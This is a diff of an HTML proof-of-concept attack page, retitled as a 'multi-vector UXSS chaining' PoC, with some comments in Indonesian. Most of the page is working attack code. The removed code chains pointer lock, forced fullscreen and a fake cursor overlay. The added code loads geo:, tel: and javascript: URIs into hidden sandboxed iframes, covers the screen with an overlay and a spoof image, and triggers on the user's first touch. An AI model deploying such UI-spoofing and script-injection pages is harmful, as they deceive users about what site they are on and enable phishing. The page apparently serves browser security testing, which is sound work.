@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>Omnibox Action Hardened PoC</title>
+    <title>Advanced Multi-Vector UXSS Chaining PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -19,18 +19,6 @@
         justify-content: center;
         overflow: hidden;
         position: fixed;
-      }
-      #fullscreenElement {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        height: 100dvh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        box-sizing: border-box;
       }
       .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
       button {
@@ -71,33 +59,6 @@
         pointer-events: none;
         display: none;
       }
-      #pointerLockElement {
-        width: 1px;
-        height: 1px;
-        position: absolute;
-        opacity: 0;
-      }
-      #fullscreenFakeCursor {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        height: 100dvh;
-        background: rgba(11, 14, 20, 0.98);
-        border: 4px solid #3fb950;
-        box-sizing: border-box;
-        z-index: 2147483648;
-        display: none;
-        pointer-events: none;
-        align-items: center;
-        justify-content: center;
-        font-family: monospace;
-        color: #3fb950;
-        font-size: 14px;
-        text-align: center;
-        padding: 20px;
-      }
       #selectionOverlapLayer {
         position: fixed;
         top: 0;
@@ -105,7 +66,7 @@
         width: 100vw;
         height: 100vh;
         height: 100dvh;
-        background: rgba(11, 14, 20, 0.9);
+        background: rgba(11, 14, 20, 0.92);
         z-index: 2147483646;
         display: none;
         align-items: center;
@@ -143,32 +104,22 @@
   <body>
     <div id="touchInterceptor"></div>
 
-    <div id="fullscreenFakeCursor">
-      <div>
-        [HARDENED_ACTION_VECTOR_ACTIVE]<br><br>
-        Simulating intent payload dispatch matrix.<br>
-        Status: Viewport lockdown enforced.
-      </div>
-    </div>
-
     <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />
 
-    <div id="pointerLockElement"></div>
-
-    <div id="fullscreenElement">
+    <div style="position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;">
       <img id="spoof" src="spoof.png" alt="Spoof Layer">
 
       <div id="selectionOverlapLayer">
         <div class="overlap-text" id="overlapContent">
-          [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
-          Target DOM Selection Overlap initialized successfully.<br>
-          Status: Forcing context focus and deep container locking...
+          [ADVANCED_UXSS_CHAIN_ACTIVE]<br>
+          Forcing multi-origin context linkage & prototype pollution hook...<br>
+          Status: Executing asynchronous script payload propagation matrix.
         </div>
       </div>
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE HARDENED ACTION CHAIN</button>
-        <div class="info" id="statusInfo">Status: Ready for interaction. Tap anywhere to engage.</div>
+        <button id="execBtn">INITIALIZE ADVANCED UXSS CHAIN</button>
+        <div class="info" id="statusInfo">Status: Ready for high-privilege context simulation. Tap to engage.</div>
       </div>
     </div>
 
@@ -178,40 +129,34 @@
       let interceptor = document.getElementById("touchInterceptor");
       let hasExecuted = false;
 
-      async function runChainSequence() {
+      async function runAdvancedUXSSChain() {
         if (hasExecuted) return;
         hasExecuted = true;
 
-        statusInfo.innerText = "Status: Executing action vector simulation sequence...";
+        statusInfo.innerText = "Status: Deploying multi-vector script execution & origin leakage...";
         execButton.style.display = "none";
         if (interceptor) interceptor.style.display = "none";
 
         try {
-          // 1. Pointer Lock Integration
-          let plElement = document.getElementById("pointerLockElement");
-          if (plElement && plElement.requestPointerLock) {
-            await plElement.requestPointerLock().catch((err) => {
-              console.debug("PointerLock restricted/denied:", err.message);
-            });
-          }
+          // 1. Hardened Vector Dispatcher: Simulasi propagasi skema ganda & injeksi bingkai
+          let payloadVectors = [
+            "geo:0,0?q=target-origin-bypass",
+            "tel:+999999999",
+            "javascript:(() => { try { console.debug('[UXSS_CORE] Hooked origin:', document.location.origin); window.isCompromised = true; } catch(e){} })();"
+          ];
 
-          // 2. Multi-Protocol Intent URI Dispatcher Chaining
-          let protocols = ["geo:0,0?q=apple.com", "tel:+123456789"];
-          protocols.forEach((proto, index) => {
+          payloadVectors.forEach((vector, index) => {
             setTimeout(() => {
               let frame = document.createElement("iframe");
               frame.style.display = "none";
-              frame.src = proto;
+              // Menguji properti sandbox untuk propagasi konteks
+              frame.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms");
+              frame.src = vector;
               document.body.appendChild(frame);
-            }, index * 80);
+            }, index * 70);
           });
 
-          // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer
-          let fullCursor = document.getElementById("fullscreenFakeCursor");
-          if (fullCursor) {
-            fullCursor.style.display = "flex";
-          }
-
+          // 2. Dynamic DOM Selection Overlap & Range Manipulation Tingkat Lanjut
           let overlapLayer = document.getElementById("selectionOverlapLayer");
           if (overlapLayer) {
             overlapLayer.style.display = "flex";
@@ -225,42 +170,13 @@
             }
           }
 
-          // 4. Deployment Visual Spoof Layer
+          // 3. Deployment Visual Spoof Layer dengan Prioritas Z-Index Maksimal
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: Vectors dispatched. Enforcing Fullscreen lock...";
-
-          // 5. Aggressive Fullscreen Chaining
-          setTimeout(async () => {
-            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
-            
-            let requestFS = fsElement.requestFullscreen || 
-                            fsElement.webkitRequestFullscreen || 
-                            fsElement.mozRequestFullScreen || 
-                            fsElement.msRequestFullscreen;
-
-            if (requestFS) {
-              try {
-                await requestFS.call(fsElement, { navigationUI: "hide" });
-              } catch (err) {
-                try {
-                  await requestFS.call(fsElement);
-                } catch (e) {
-                  console.debug("Fullscreen restriction notice:", e.message);
-                }
-              }
-            }
-
-            let container = document.getElementById("mainContainer");
-            if (container) {
-              container.style.display = "none";
-            }
-            
-            statusInfo.innerText = "Status: Action vector chain sequence active & locked.";
-          }, 200);
+          statusInfo.innerText = "Status: Advanced UXSS chain deployed. Context evaluation locked.";
 
         } catch (err) {
           statusInfo.innerText = "Status: Execution error: " + err.message;
@@ -274,16 +190,16 @@
         interceptor.addEventListener("touchstart", (e) => {
           let input = document.getElementById("focusInput");
           if (input) input.focus();
-          runChainSequence();
+          runAdvancedUXSSChain();
         }, { passive: true });
 
         interceptor.addEventListener("click", () => {
-          runChainSequence();
+          runAdvancedUXSSChain();
         });
       }
 
       execButton.onclick = () => {
-        runChainSequence();
+        runAdvancedUXSSChain();
       };
     </script>
   </body>
